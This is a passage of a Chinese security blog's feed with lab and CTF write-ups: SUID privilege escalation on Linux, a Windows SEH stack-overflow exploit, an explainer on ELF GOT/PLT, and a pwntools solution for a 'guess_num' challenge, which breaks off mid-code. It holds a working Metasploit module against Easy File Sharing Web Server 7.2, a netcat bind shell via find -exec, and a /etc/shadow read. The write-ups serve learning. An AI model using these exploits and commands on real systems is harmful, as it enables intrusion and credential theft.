id="查找开启SUID的命令"><a href="#查找开启SUID的命令" class="headerlink" title="查找开启SUID的命令"></a>查找开启SUID的命令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -<span class="built_in">exec</span> ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure><h4 id="nmap利用"><a href="#nmap利用" class="headerlink" title="nmap利用"></a>nmap利用</h4><p>nmap版本小于5.21时，可打开交互模式。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap —interactive</span><br><span class="line">nmap&gt;!sh</span><br></pre></td></tr></table></figure><p>也可以通过Metasploit模块对Nmap的二进制文件进行权限提升。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit/unix/<span class="built_in">local</span>/setuid_nmap</span><br></pre></td></tr></table></figure><p>在这个脚本中有一段注释。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Note that modern interpreters will refuse to run scripts on the command line when EUID !&#x3D; UID, so the cmd&#x2F;unix&#x2F;reverse_&#123;perl,ruby&#125; payloads will most likely not work.</span><br></pre></td></tr></table></figure><p>这段注释的翻译为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注意，当EUID !&#x3D; UID时，现代解释器将拒绝在命令行上运行脚本，因此cmd&#x2F;unix&#x2F;reverse_&#123;perl,ruby&#125;负载很可能无法工作。</span><br></pre></td></tr></table></figure><h4 id="find利用"><a href="#find利用" class="headerlink" title="find利用"></a>find利用</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find existFile -<span class="built_in">exec</span> whoami \;</span><br><span class="line">find existFile -<span class="built_in">exec</span> nc -lvp 4444 -e /bin/sh \;</span><br><span class="line">find existFile -<span class="built_in">exec</span> cat /etc/shadow \;</span><br></pre></td></tr></table></figure><p>其中第二个命令在实践时发现打开的命令行任然是普通用户的权限。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200614174739.png"></p><p>可以看到这时的uid和euid的值都为1000。因此这种方式现在可能会失效。但是其他方式还是可以的。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200614174907.png"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 提权 </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻击windows异常处理机制SEH</title>
      <link href="2020/05/22/20200522211303/"/>
      <url>2020/05/22/20200522211303/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h1><p>本文主要有两个部分。第一部分介绍windows异常处理机制中的SEH，详细介绍SEH的工作原理。第二部分介绍如何通过栈溢出实现利用SEH来绕过GS。</p><h1 id="0x01-SEH（异常处理结构体）"><a href="#0x01-SEH（异常处理结构体）" class="headerlink" title="0x01 SEH（异常处理结构体）"></a>0x01 SEH（异常处理结构体）</h1><p>SEH的全称是Structure Exception Handler，翻译为异常处理结构体，它是Windows异常处理机制所采用的的重要数据结构。每个SEH结构体包含两个DWORD指针：SEH链表指针和异常处理函数句柄，共八个字节。如下图：</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200522212236.png"></p><h4 id="对SEH的初步理解，我们要了解一下几点："><a href="#对SEH的初步理解，我们要了解一下几点：" class="headerlink" title="对SEH的初步理解，我们要了解一下几点："></a>对SEH的初步理解，我们要了解一下几点：</h4><ol><li>S.E.H结构体存放在系统栈中。</li><li>当线程初始化时，会自动向栈中安装一个S.E.H，作为线程默认的异常处理。</li><li>如果程序源代码中使用了<code>__try&#123;&#125;__except&#123;&#125;</code>或者<code>Assert</code>宏等异常处理机制，编译器将最终通过向当前函数栈帧中安装一个S.E.H来实现异常处理。</li><li>栈中一般会同时存在多个S.E.H。</li><li>栈中的多个S.E.H通过链表指针在栈内由栈顶向栈底串成单向链表，位于链表最顶端的S.E.H通过T.E.B（线程环境块）0字节偏移处的指针标识，FS寄存器指向TEB的位置。</li><li>当异常发生时，操作系统会中断程序，并首先从T.E.B的0字节偏移处取出距离栈顶最近的S.E.H，使用异常处理函数句柄所指向的代码来处理异常。</li><li>当离“事故现场”最近的异常处理函数运行失败时，将顺着S.E.H链表依次尝试其他的异常处理函数。</li><li>如果程序安装的所有异常处理函数都不能处理，系统将采用默认的异常处理函数。通常，这个函数会弹出一个错误对话框，然后强制关闭程序。</li></ol><h4 id="大概了解SEH的工作原理后，发现以下问题："><a href="#大概了解SEH的工作原理后，发现以下问题：" class="headerlink" title="大概了解SEH的工作原理后，发现以下问题："></a>大概了解SEH的工作原理后，发现以下问题：</h4><ol><li>S.E.H存放在栈内，故溢出缓冲区的数据有可能淹没S.E.H。</li><li>精心制造的溢出数据可以把S.E.H中异常处理函数的入口地址更改为shellcode的起始地址。</li><li>溢出后错误的栈帧或堆块数据往往会触发异常。</li><li>当Windows开始处理溢出后的异常时，会错误地把shellcode当做异常处理函数而执行。</li></ol><p>这样，就可以绕过GS这种栈的保护机制，不通过溢出到返回地址，而是溢出修改SEH结构的异常处理函数的句柄，从而实现攻击。</p><blockquote><p>注：异常处理机制和堆分配机制一样，会检测进程是否处于调试状态。异常处理在使用回调函数之前，系统会判断当前是否处于调试状态，如果处于调试状态，将把异常交给调试器处理。</p></blockquote><h1 id="0x02-详解SEH工作中的栈空间"><a href="#0x02-详解SEH工作中的栈空间" class="headerlink" title="0x02 详解SEH工作中的栈空间"></a>0x02 详解SEH工作中的栈空间</h1><p>上面我们简单介绍了Windows在处理异常时的工作流程，但是我们如果要利用SEH来达到攻击的目的，则还需要知道在异常处理的时候的栈空间的状态。</p><p>在程序运行过程中，当触发了异常，程序尝试处理异常的时候，首先系统会执行异常的回调函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line">EXCEPTION_DISPOSITION</span><br><span class="line">__cdecl _except_handler( struct _EXCEPTION_RECORD *ExceptionRecord,</span><br><span class="line">                        <span class="keyword">void</span> * EstablisherFrame,</span><br><span class="line">                        struct _CONTEXT *ContextRecord,</span><br><span class="line">                        <span class="keyword">void</span> * DispatcherContext);</span><br></pre></td></tr></table></figure><p>并在栈中压入一个<code>EXCEPTION_DISPOSITION Handler</code>结构，如下图。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200522220053.png"></p><p>这个时候，esp指向栈顶位置就是这个结构体。这个结构体中包含这从TEB中得到的第一个SEH结构体的位置。这个时候，通过Establisher Frame找到第一个SEH结构体的位置，执行异常处理函数。</p><blockquote><p>注：这一块栈空间的变化可以参考<a href="https://blog.csdn.net/iamsongyu/article/details/102860309">逆向与破解-windows异常处理机制</a></p></blockquote><h1 id="0x03-利用SEH"><a href="#0x03-利用SEH" class="headerlink" title="0x03 利用SEH"></a>0x03 利用SEH</h1><p>我们知道了SEH的工作原理和执行时的栈空间的变化，接下来我们学习如何利用栈溢出，达到利用SEH进行攻击的方法。</p><h4 id="基本步骤："><a href="#基本步骤：" class="headerlink" title="基本步骤："></a>基本步骤：</h4><ol><li>首先要得到溢出点到SEH结构体的偏移量。</li><li>然后要得到shellcode的起始位置。</li><li>触发异常。</li></ol><p>以上步骤是最基本的，在真实的环境中我们还需要考虑其他因素。比如，在第二步中，理论上我们将SEH的后4个字节修改成shellcode的起始地址就可以了，但是如果开启了地址随机化，我们的shellcode的地址就无法准确的找到。所以一般是找未开启SafeSEH保护的<code>pop/pop/ret</code>的代码段，通过这个代码段跳转到shellcode中。为什么要利用PPR代码段，看下面。</p><h1 id="0x04-为什么需要PPR来利用SEH"><a href="#0x04-为什么需要PPR来利用SEH" class="headerlink" title="0x04 为什么需要PPR来利用SEH"></a>0x04 为什么需要PPR来利用SEH</h1><p>我们分析上面那张栈空间的图可以发现，当触发异常时，此时的esp指向的是<code>EXCEPTION_DISPOSITION Handler</code>，当执行异常处理函数，PPR时，esp向高地址移动8个字节，指向了Establisher Frame，存着第一个SEH的地址，因此执行ret会将eip指向SEH，此时如果SEH的前两个字节为<code>EB06</code>，则会执行jmp指令，向下跳转6个字节，如果下面是一堆nop跟着shellcode，则会顺利滑进shellcode，成功执行。</p><h1 id="0x05-实践"><a href="#0x05-实践" class="headerlink" title="0x05 实践"></a>0x05 实践</h1><p>实验环境：windows xp、kali</p><p>实验软件：Easy File Sharing Web Server 7.2、Immunity Debugger</p><p>实验步骤：</p><ol><li><p>首先先生成一段用于溢出的字符串。</p><p>这里用到的工具是kali下msf自带的一个生成脚本pattern_create.rb。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf-pattern_create -l 10000 &gt; 1.txt</span><br></pre></td></tr></table></figure></li><li><p>xp上打开Easy File Sharing Web Server 7.2，并启动服务。用Immunity Debugger调试器attach到EFSWS的进程上，并点击run，使程序运行中。</p></li><li><p>通过脚本将字符串发给xp的80端口。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"> </span><br><span class="line">host = <span class="built_in">str</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">port = <span class="built_in">int</span>(sys.argv[<span class="number">2</span>])</span><br><span class="line"> </span><br><span class="line">a = socket.socket()</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Connecting to: &quot;</span> + host + <span class="string">&quot;:&quot;</span> + <span class="built_in">str</span>(port)</span><br><span class="line">a.connect((host,port))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># 这里是上一步生成的1.txt文件的内容</span></span><br><span class="line">buff = <span class="string">&quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2...&quot;</span></span><br><span class="line"> </span><br><span class="line">a.send(<span class="string">&quot;HEAD &quot;</span> + buff + <span class="string">&quot; HTTP/1.0\r\n\r\n&quot;</span>)</span><br><span class="line"> </span><br><span class="line">a.close()</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Done...&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>打开Immunity Debugger的SEH chain，可发现如下图所示。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200523154502.png"></p><p>这里面显示的当前的SEH的handler为0x46356646，指向的下一个SEH的地址为0x34664633。因此，我们溢出字符串覆盖的SEH结构体的值为0x3466463346356646。</p></li><li><p>查找0x34664633在溢出字符串中的偏移量。这里为什么是前4个字节，因为pattern_offset工具找的是四个字节在pattern中的偏移位置，所以我们只需要知道SEH结构体的前四个字节中的值对应的偏移。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf-pattern_offset -q 34664633</span><br></pre></td></tr></table></figure><p>执行后，获得偏移量。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200523155744.png"></p></li><li><p>通过Immunity Debugger的mona插件，寻找该程序中可以利用的dll模块。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona modules</span><br></pre></td></tr></table></figure><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200523164151.png" style="zoom: 33%;"></li><li><p>找到其中未开启SafeSEH的可利用模块，这里选择第一个ImageLoad.dll，并通过msfbinscan找其中的PPR。</p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200523164438.png" style="zoom:50%;"></li><li><p>写exp，并将脚本放入msf的exploit的目录下，以让msf能够找到攻击脚本。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;msf/core&#x27;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MetasploitModule</span> &lt; Msf::Exploit::<span class="title">Remote</span></span></span><br><span class="line">  Rank = NormalRanking</span><br><span class="line">  <span class="keyword">include</span> Msf::Exploit::Remote::Tcp</span><br><span class="line">  <span class="keyword">include</span> Msf::Exploit::Seh</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">initialize</span><span class="params">(info = &#123;&#125;)</span></span></span><br><span class="line">    <span class="keyword">super</span>(update_info(info,</span><br><span class="line">      <span class="string">&#x27;Name&#x27;</span>            =&gt; <span class="string">&#x27;Easy File Sharing HTTP Server 7.2 SEH Overflow&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;Description&#x27;</span>     =&gt; <span class="string">%q&#123;</span></span><br><span class="line"><span class="string">        This Module Demonstrate SEH based overflow example</span></span><br><span class="line"><span class="string">      &#125;</span>,</span><br><span class="line">      <span class="string">&#x27;Author&#x27;</span>          =&gt; <span class="string">&#x27;yanhan&#x27;</span>,</span><br><span class="line"></span><br><span class="line">      <span class="string">&#x27;Payload&#x27;</span>         =&gt;</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="string">&#x27;Space&#x27;</span>       =&gt; <span class="number">390</span>,</span><br><span class="line">          <span class="string">&#x27;BadChars&#x27;</span>    =&gt; <span class="string">&quot;\x00\x7e\x2b\x26\x3d\x25\x3a\x22\x0a\x0d\x20\x2f\x5c\x2e&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">      <span class="string">&#x27;Platform&#x27;</span>      =&gt; <span class="string">&#x27;Windows&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;Targets&#x27;</span>       =&gt;</span><br><span class="line">          [</span><br><span class="line">               [</span><br><span class="line">                 <span class="string">&#x27;Easy File Sharing 7.2 HTTP&#x27;</span>,</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="string">&#x27;Ret&#x27;</span>       =&gt; <span class="number">0x100188fc</span>,</span><br><span class="line">                <span class="string">&#x27;Offset&#x27;</span>    =&gt; <span class="number">4061</span></span><br><span class="line">              &#125;</span><br><span class="line">               ]</span><br><span class="line">           ],</span><br><span class="line">      <span class="string">&#x27;DisclosureDate&#x27;</span>  =&gt; <span class="string">&#x27;2019-01-16&#x27;</span>,</span><br><span class="line">  ))</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">exploit</span></span></span><br><span class="line">    connect</span><br><span class="line">    weapon = <span class="string">&quot;HEAD &quot;</span></span><br><span class="line">    weapon &lt;&lt; make_nops(target[<span class="string">&#x27;Offset&#x27;</span>])</span><br><span class="line">    weapon &lt;&lt; generate_seh_record(target[<span class="string">&#x27;Ret&#x27;</span>])</span><br><span class="line">    weapon &lt;&lt; make_nops(<span class="number">20</span>)</span><br><span class="line">    weapon &lt;&lt; payload.encoded</span><br><span class="line">    weapon &lt;&lt; <span class="string">&quot; HTTP/1.0\r\n\r\n&quot;</span></span><br><span class="line">    sock.put(weapon)</span><br><span class="line">    handler</span><br><span class="line">    disconnect</span><br><span class="line">   <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在脚本中Ret值是我们找到的PPR的地址，Offset是我们找到的溢出点。</p></li><li><p>msf中运行攻击脚本获得目标xp的meterpreter。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200523165943.png"></p></li></ol><p>参考自杨老师<a href="https://blog.csdn.net/Eastmount/article/details/104593520">SEH异常处理机制的栈溢出攻击及shell提取</a>。</p><h1 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h1><p>成功之后，思考通过mona找到了很多的dll，其中也有别的没有开SafeSEH，是不是也可以加以利用。实践发现在系统dll文件msasn1.dll中的0x76218422也有PPR可以利用。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
            <tag> windows异常处理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>elf文件的GOT和PLT</title>
      <link href="2020/05/06/20200506120302/"/>
      <url>2020/05/06/20200506120302/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-写在开始"><a href="#0x00-写在开始" class="headerlink" title="0x00 写在开始"></a>0x00 写在开始</h1><p>首先，我是从PE文件开始学习的，之后接触到了Linux下的ELF文件，在本质上来说，无论是Windows下的PE文件，还是Linux下的elf文件，他们本质上都是一个可执行文件，所运行的平台不同，它们的文件格式也有不同，但究其本质，还是会有互通的地方。</p><h1 id="0x01-基础知识"><a href="#0x01-基础知识" class="headerlink" title="0x01 基础知识"></a>0x01 基础知识</h1><p>首先，elf文件也是由众多的节构成的，可以通过<code>objdump -h</code>查看。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200506153826.png"></p><p>下面解释<code>.got</code>、<code>.plt</code>、<code>.got.plt</code>三个节。</p><h4 id="got"><a href="#got" class="headerlink" title=".got"></a>.got</h4><p>GOT(Global Offset Table)全局偏移表。这是链接器为外部符号填充的实际偏移表。</p><p>.got Section中存放外部全局变量的GOT表，例如stdin/stdout/stderr，非延迟绑定</p><h4 id="plt"><a href="#plt" class="headerlink" title=".plt"></a>.plt</h4><p>PLT(Procedure Linkage Table)程序链接表。作用是一个跳板，保存了某个符号在重定位表中的偏移量(用来第一次查找某个符号)和对应的.got.plt的对应的地址。它有两个功能，要么在<code>.got.plt</code>节中拿到地址，并跳转。要么当<code>.got.plt</code>没有所需地址的时候，触发链接器去找到所需的地址。</p><h4 id="got-plt"><a href="#got-plt" class="headerlink" title=".got.plt"></a>.got.plt</h4><p>这个是GOT专门为PLT准备的节。保存了重定位地址。<code>.got.plt</code>中的值是GOT的一部分。它包含上述PLT表所需地址(已经找到的和需要去触发的)。</p><p>.got.plt Section中存放外部函数的GOT表，例如printf，采用延迟绑定</p><h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><p>比如printf是一个重定位符号，需要链接该符号时过程是这样：</p><p>main函数call  .plt段中的一个地址，这里的第一句话就是跳转到.got.plt中的保存的printf的地址，如果是第一次，那么保存的地址就是.plt中的下一句话，这个下一句话就是压入这个符号在.rel.plt中的重定位表的偏移量，然后ld程序就会根据重定位表中的信息加上这个偏移量找到这个地址，保存到重定位表所指向的地址中，这个地址其实就是.got.plt段的一个地址。</p><p>第二次调用时就可以直接获取到.got.plt中保存的地址了。</p><h1 id="0x02-实践"><a href="#0x02-实践" class="headerlink" title="0x02 实践"></a>0x02 实践</h1><p>接下来我们来实践一下，加深对这几个节的认识。</p><p>首先要有一个分析的程序，我们用一个helloworld。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc -m32 -no-pie -g -o helloworld_li helloworld.c</span></span><br><span class="line"><span class="comment">//-g 产生有调试符号的程序</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Hello World!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>用gdb打开该文件，开始分析：</p><ul><li><p>首先反汇编main</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/image-20200506162420073.png"></p></li><li><p>找到call puts的地址，用<code>b *0x804844b</code>下断点，<code>r</code>执行到断点处并通过<code>si</code>单步步入。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200506164301.png"></p><p>我们可以看到当前指令是jmp跳转指令，跳转到0x804a00c。</p><p>我们之前通过<code>objdump</code>查看该文件的各个节，发现0x804a00c是在<code>.got.plt</code>中。</p></li><li><p>我们使用<code>x/wx 0x804a00c</code>查看这个位置的值。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/image-20200506172031681.png" alt="image-20200506172031681"></p><p>发现该地址存着的信息是当前执行指令的下一个位置。所以执行<code>jmp [0x804a00c]</code>后会到<code>0x80482e6</code>的位置。</p><p>这里就可以理解，在第一次执行时，plt在<code>.got.plt</code>中没找到puts函数的地址，然后触发链接器去寻找puts函数的地址。</p></li><li><p>通过<code>finish</code>执行完当前函数，然后再查看<code>0x804a00c</code>位置的内容。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/image-20200506173453829.png" alt="image-20200506173453829"></p><p>可以发现该位置的值已经变了，该地值便是puts函数的地址。</p></li></ul><h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><p>主要是在学习rop的时候，中间提到了<code>return to libc</code>，通过调用系统函数，而不是shellcode来实现打开shell。有一种方法是<code>return to PLT</code>，因为之前学习的是windows下的，对这个PLT很陌生，因此查资料学习了一下。windows下和linux下，有很多共通的地方，比如说这里的<code>.plt</code>和<code>.got.plt</code>同windows下的PE文件输入表中的<code>INT</code>和<code>IAT</code>很像。</p><p>参考链接：<a href="https://www.jianshu.com/p/5092d6d5caa3">https://www.jianshu.com/p/5092d6d5caa3</a></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
            <tag> elf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>(wp)攻防世界PWN——guess_num</title>
      <link href="2020/04/02/20200402213448/"/>
      <url>2020/04/02/20200402213448/</url>
      
        <content type="html"><![CDATA[<p>好久没有做PWN题了，今天开始做一下，把之前的东西捡起来，同时对之前有些知识点也有了新的认识，新的理解。</p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>首先将附件下载下来，同时通过nc连接一下，了解一下大致的流程。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200402220645.png"></p><p>可以看到，先让我们输入用户名，然后输入猜的的数字。</p><p>然后常规操作，通过<code>file</code>和<code>checksec</code>工具判断文件类型和开启了那些防护措施。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200402220856.png"></p><p>可以知道这是一个64位的linux程序，并且开启了部分只读，栈溢出保护，不可执行和地址随机化。</p><p>接着我们通过IDA加载，反汇编一下。</p><p>IDA加载程序后，<code>ctrl+F5</code>查看一下伪代码。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200402221626.png"></p><p>我们点击进入<code>sub_C3E()</code>，发现它会调用系统函数，打印flag，因此我们要保证程序能执行到这一步。</p><p>因此，在<code>v4</code>和<code>v6</code>比较时我们要保证这两个值相同，其中<code>v4</code>是我们的输入值，<code>v6</code>是随机数。我们知道这里的随机数是通过种子<code>seed</code>来形成的，如果<code>seed</code>一定，那么生成的随机数也是一定的。</p><p>双击<code>seed[0]</code>，可以发现<code>seed</code>是在栈帧中的，上面还有<code>var_30</code>。</p><p>查看汇编代码。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200402222715.png"></p><p>在代码中可以找到如下信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var_30 &#x3D; byte ptr -30h</span><br><span class="line">seed   &#x3D; dword ptr -10h</span><br><span class="line"></span><br><span class="line">lea     rax, [rbp+var_30]</span><br><span class="line">mov     rdi, rax</span><br><span class="line">mov     eax, 0</span><br><span class="line">call    _gets</span><br><span class="line">mov     rax, qword ptr [rbp+seed]</span><br><span class="line">mov     edi, eax        ; seed</span><br><span class="line">call    _srand</span><br></pre></td></tr></table></figure><p>我们输入的name，存在栈帧中，占20h，下面高地址位紧跟着seed的值。因此我们可以溢出覆盖掉seed，将种子设置为已知值，从而控制生成的随机数。</p><p>写出exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&#x27;/bin/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">libc.srand(<span class="number">1</span>)</span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * <span class="number">0x20</span> + p64(<span class="number">1</span>).decode()</span><br><span class="line">r = remote(<span class="string">&#x27;111.198.29.45&#x27;</span>, <span class="number">57255</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;name:&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    num = <span class="built_in">str</span>(libc.rand() % <span class="number">6</span> + <span class="number">1</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;number:&#x27;</span>)</span><br><span class="line">    io.sendline(num)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其中so文件的路径是通过<code>ldd</code>工具找到的。</p><p>在这里，如果我们的开发环境不是在linux下，比如我是在MAC下，那么我们怎么去获得这个so文件呐。</p><p>既然没有，那我们是不是可以自己写一个呐，说干就干。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span 